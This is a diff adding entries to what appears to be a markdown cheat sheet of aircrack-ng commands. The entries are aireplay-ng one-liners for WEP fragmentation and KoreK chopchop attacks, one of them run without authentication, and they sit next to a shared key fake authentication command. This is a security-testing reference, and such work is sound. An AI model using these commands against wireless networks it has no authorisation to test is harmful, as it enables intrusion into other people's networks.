@@ -151,10 +151,23 @@ Perform Shared Key Fake Authentication
 aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B -y sharedkey*.xor mon0
 ```
 
+## [Fragmentation Attack](https://www.aircrack-ng.org/doku.php?id=fragmentation)
 
+```
+aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+```
 
+## [Crack WEP KoreK chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop)
 
+```
+aireplay-ng -4 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+```
 
+Chopchop Without Authentication
+
+```
+aireplay-ng -4 -b 00:14:6C:7E:40:80 mon0
+```
 
 
 
